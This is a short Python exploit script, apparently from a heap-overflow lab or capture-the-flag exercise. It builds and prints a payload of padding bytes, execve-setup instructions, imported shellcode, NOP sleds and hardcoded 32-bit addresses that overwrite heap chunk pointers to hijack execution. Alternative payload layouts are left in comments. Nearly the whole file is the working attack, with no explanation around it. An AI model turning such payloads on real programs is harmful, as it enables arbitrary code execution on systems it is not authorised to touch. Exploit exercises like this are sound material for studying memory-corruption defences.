from struct import pack
from shellcode import shellcode

prev_a_addr = pack("<I", 0x080f3724)
prev_b_addr = pack("<I", 0xbffeb8d8)
return_addr = pack("<I", 0x080f3778)
prev_c_addr = pack("<I", 0x080f3784)

print("\xaa"*4 + "\x6a\x0b\x58\x99" + shellcode + " " + "\xaa"*40 + pack("<I", 0xBFFEA6C8) + pack("<I", 0x080F3724) + " " + "\xaa"*4)

#print("\xaa"*4 + "\x6a\x0b\x58\x99" + shellcode + " " + "\xaa"*40 + pack("<I", 0xBFFEB8D8) + pack("<I", 0x080F3724) + " " + "\xaa"*4)

quavo = ("\x90" * 8) +  shellcode
offset = ("\x90" * 40) + prev_b_addr + prev_a_addr
takeoff = ("\x90" * 4)

'''
quavo = ("\x90" * 40) + prev_a_addr + return_addr
offset = ("\x90" * 40) + prev_b_addr + prev_c_addr
takeoff = ("\x90" * 8) + shellcode 
'''
#print(quavo)
#print(offset)
#print(takeoff)
